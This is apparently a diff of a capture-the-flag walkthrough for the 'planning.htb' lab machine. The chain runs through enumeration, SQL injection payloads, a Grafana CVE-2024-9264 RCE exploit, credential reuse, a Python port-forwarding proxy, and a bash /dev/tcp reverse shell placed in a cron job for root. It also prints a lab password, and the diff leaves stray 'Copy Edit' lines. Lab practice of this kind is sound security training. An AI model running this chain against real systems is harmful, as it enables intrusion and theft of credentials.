@@ -8,11 +8,10 @@ cat /etc/hosts
 
 # Manually verify or append the following entry if not present:
 # 10.129.34.41    planning.htb
-```
-
-## Directory Enumeration with Gobuster
-
-```bash
+Directory Enumeration with Gobuster
+bash
+Copy
+Edit
 # Perform a basic directory scan using a medium-sized custom wordlist
 gobuster dir -u http://planning.htb -w medium.txt
 
@@ -26,11 +25,10 @@ gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirbuster/directory-
 # /detail.php           (Possibly individual course or item details)
 # /course.php           (Course-related listing)
 # /enroll.php           (Enrollment form or functionality)
-```
-
-## Subdomain Enumeration with wfuzz
-
-```bash
+Subdomain Enumeration with wfuzz
+bash
+Copy
+Edit
 # Navigate to the DNS wordlist directory from SecLists
 cd SecLists-master/Discovery/DNS
 
@@ -42,11 +40,10 @@ wfuzz -c -w subdomains.txt -u 'http://planning.htb/' -H "Host: FUZZ.planning.htb
 
 # After discovering a valid subdomain (e.g., grafana.planning.htb), add it to your hosts file:
 echo "10.129.34.41 grafana.planning.htb" | sudo tee -a /etc/hosts
-```
-
-## SQL Injection Testing with sqlmap
-
-```bash
+SQL Injection Testing with sqlmap
+bash
+Copy
+Edit
 # Capture the POST request using Burp Suite and save it to a file (e.g., request.txt)
 # The request targets /search with a keyword parameter
 
@@ -60,14 +57,11 @@ sqlmap -r request.txt --batch --level=5 --risk=3 --random-agent
 # - UNION-based SQLi
 # - Stacked queries
 
-# Also attempts DBMS fingerprinting and parameter analysis.
-
 # Output: No injectable parameters were found. The keyword parameter appears static.
-```
-
-## Manual SQLi Payload Testing
-
-```bash
+Manual SQLi Payload Testing
+bash
+Copy
+Edit
 # Manual payloads tested via Burp Repeater or browser input:
 
 # Boolean-based tautologies:
@@ -100,11 +94,10 @@ Host: planning.htb
 Host: ' OR 1=1 --
 
 # Conclusion: None of the tested injections yielded a positive result. The parameter was confirmed non-vulnerable.
-```
-
-## Exploiting Grafana via CVE-2024-9264
-
-```bash
+Exploiting Grafana via CVE-2024-9264
+bash
+Copy
+Edit
 # Download the exploit code archive from GitHub
 wget https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/archive/refs/heads/main.zip -O rce.zip
 
@@ -121,14 +114,13 @@ python3 poc.py --url http://grafana.planning.htb \
 
 # Set up a netcat listener to catch the reverse shell
 nc -lvnp 4444
-```
-
-## Post Exploitation Enumeration (Container)
-
-```bash
+Post Exploitation Enumeration (Container)
+bash
+Copy
+Edit
 # Confirm access to containerized reverse shell
 whoami
-# Expected output: root
+# Output: root
 
 # Enumerate environment variables for potential secrets
 env
@@ -142,11 +134,10 @@ cat run.sh
 
 # Attempt SSH to the host machine using discovered credentials
 ssh enzo@10.129.34.41
-```
-
-## Host Access and Enumeration
-
-```bash
+Host Access and Enumeration
+bash
+Copy
+Edit
 # Validate user access after successful SSH login
 whoami
 # Output: enzo
@@ -158,11 +149,10 @@ cat ~/user.txt
 wget http://10.10.14.19:80/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
-```
-
-## Network and Service Enumeration
-
-```bash
+Network and Service Enumeration
+bash
+Copy
+Edit
 # List all listening TCP and UDP ports with associated processes
 ss -tulnp
 
@@ -172,13 +162,58 @@ lsof -i :8000
 
 # Validate SSH tunnel connections or manually forwarded ports
 ps aux | grep 23357
-```
+Port Forwarding Custom Proxy (8000 to 5555)
+python
+Copy
+Edit
+import socket
+import threading
 
-## Final Notes and Takeaways
+def forward(source, destination):
+    while True:
+        data = source.recv(4096)
+        if not data:
+            break
+        destination.sendall(data)
 
-* Enumeration revealed a Grafana instance accessible via subdomain, which was not immediately obvious from the main site.
-* Admin credentials were provided upon subdomain discovery, enabling exploitation of CVE-2024-9264.
-* The exploit granted root access within a container, which exposed further credentials used for lateral movement to the actual host.
-* Environment variables within the container held reusable secrets for host pivoting.
-* Sqlmap and manual testing confirmed the search endpoint was not vulnerable to SQL injection.
-* The walkthrough demonstrates the value of chaining recon, subdomain fuzzing, and PoC RCE with post-exploitation enumeration.
+listen = socket.socket()
+listen.bind(("0.0.0.0", 5555))
+listen.listen(5)
+
+while True:
+    client_sock, _ = listen.accept()
+    server_sock = socket.socket()
+    server_sock.connect(("127.0.0.1", 8000))
+
+    threading.Thread(target=forward, args=(client_sock, server_sock)).start()
+    threading.Thread(target=forward, args=(server_sock, client_sock)).start()
+bash
+Copy
+Edit
+# Access the cron web interface via proxy:
+firefox http://planning.htb:5555
+
+# Login with:
+# Username: root
+# Password: P4ssw0rdS0pRi0T3c
+Triggering Reverse Shell via Cron Job Interface
+bash
+Copy
+Edit
+# Insert a one-liner reverse shell payload into the cron job
+/bin/bash -i >& /dev/tcp/10.10.14.99/4444 0>&1
+
+# Set up a listener to catch the shell
+nc -lvnp 4444
+
+# You should now have root shell on the host
+whoami
+# Output: root
+Final Notes
+The cron.db file revealed credentials for the cron UI (root/P4ssw0rdS0pRi0T3c).
+
+LinPEAS helped locate the cron job database file.
+
+Port 8000 was locally accessible only; a manual Python proxy was used to expose it on 5555.
+
+Chaining the Grafana RCE with credentials reuse and custom port forwarding enabled full root compromise.
